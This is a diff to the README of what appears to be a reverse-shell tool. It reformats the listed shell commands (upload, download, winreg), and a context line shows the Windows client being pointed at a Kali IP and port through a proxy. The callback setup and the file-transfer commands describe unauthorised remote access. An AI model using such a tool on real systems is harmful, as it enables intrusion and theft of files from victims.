@@ -28,9 +28,11 @@ C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 ```get-pip.py``` To install pip for python2 (after deprecation). Reference: https://bootstrap.pypa.io/
 
 ## COMMANDS:
-upload [filename]
-download [filename]     => Need to rename file after download.
-winreg                  => displays help message
+```upload [filename]```
+
+```download [filename]```     => Need to rename file after download.
+
+```winreg```                 => displays help message
 
 
 ## Install
